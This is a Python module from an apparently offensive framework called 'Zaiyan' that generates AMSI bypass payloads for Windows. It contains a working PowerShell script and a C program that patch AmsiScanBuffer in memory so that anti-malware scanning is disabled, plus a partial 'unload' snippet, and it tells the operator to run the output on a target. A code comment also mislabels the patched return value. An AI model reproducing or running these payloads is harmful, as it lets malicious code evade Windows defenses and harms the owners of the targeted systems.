import ctypes
from core.module_base import ZaiyanModule

class AMSIBypass(ZaiyanModule):
    NAME = "amsi_bypass"
    DESCRIPTION = "AMSI (Anti-Malware Scan Interface) bypass for Windows"
    AUTHOR = "Anonymous-beta"
    MODULE_TYPE = "evasion"
    PLATFORM = ["windows"]
    
    def _setup_options(self):
        self.options = {
            "METHOD": {
                "description": "Bypass method: patch, memory, unload",
                "required": False,
                "value": "patch"
            },
            "TARGET": {
                "description": "Target process (0=self)",
                "required": False,
                "value": "0"
            }
        }
    
    def execute(self):
        """Execute AMSI bypass"""
        method = self.get_option("METHOD")
        target = int(self.get_option("TARGET"))
        
        print(f"[*] Method: {method}")
        print(f"[*] Target PID: {target}")
        
        if method == "patch":
            return self._patch_amsi(target)
        elif method == "memory":
            return self._memory_patch(target)
        elif method == "unload":
            return self._unload_amsi(target)
        else:
            print(f"[-] Unknown method: {method}")
            return False
    
    def _patch_amsi(self, pid: int):
        """Patch AMSI scan buffer to always return clean"""
        # PowerShell patch technique
        ps_patch = '''
$w = Add-Type -MemberDefinition @"
[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string lpModuleName);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -Name "ZaiyanPatch" -PassThru

$amsi = $w::GetModuleHandle("amsi.dll")
$scan = $w::GetProcAddress($amsi, "AmsiScanBuffer")
$p = 0
$w::VirtualProtect($scan, [UIntPtr]::new(5), 0x40, [ref]$p)
$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scan, 6)
Write-Host "[+] AMSI patched"
'''
        print("[+] PowerShell patch generated")
        print("[*] Execute on target to disable AMSI scanning")
        
        return {
            "method": "patch",
            "script": ps_patch,
            "description": "Patches AmsiScanBuffer to return AMSI_RESULT_CLEAN"
        }
    
    def _memory_patch(self, pid: int):
        """Patch AMSI in memory via direct memory manipulation"""
        print("[*] Memory patch technique")
        print("[*] Requires handle to target process")
        
        code = '''
#include <windows.h>
#include <stdio.h>

int main() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    void* scan = GetProcAddress(amsi, "AmsiScanBuffer");
    
    DWORD oldProtect;
    VirtualProtect(scan, 6, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // mov eax, 0x80070057 (AMSIR_RESULT_CLEAN)
    // ret
    unsigned char patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
    memcpy(scan, patch, sizeof(patch));
    
    VirtualProtect(scan, 6, oldProtect, &oldProtect);
    printf("[+] AMSI patched\\n");
    return 0;
}
'''
        return {
            "method": "memory",
            "c_source": code
        }
    
    def _unload_amsi(self, pid: int):
        """Unload AMSI DLL from process"""
        ps_unload = '''
[Reflection.Assembly]::LoadWithPartialName("System.Core") | Out-Null
$domain = [AppDomain]::CurrentDomain
$assemblies = $domain.GetAssemblies()

foreach ($assembly in $assemblies) {
    if ($assembly.FullName -like "*Amsi*") {
        Write-Host "[*] Found AMSI assembly: $($assembly.FullName)"
    }
}

# Force unload via reflection
$amsi = [Ref].Assembly.GetTypes() | Where-Object {$_.Name -like "*Amsi*"}
Write-Host "[+] AMSI references located"
'''
        return {
            "method": "unload",
            "script": ps_unload
        }
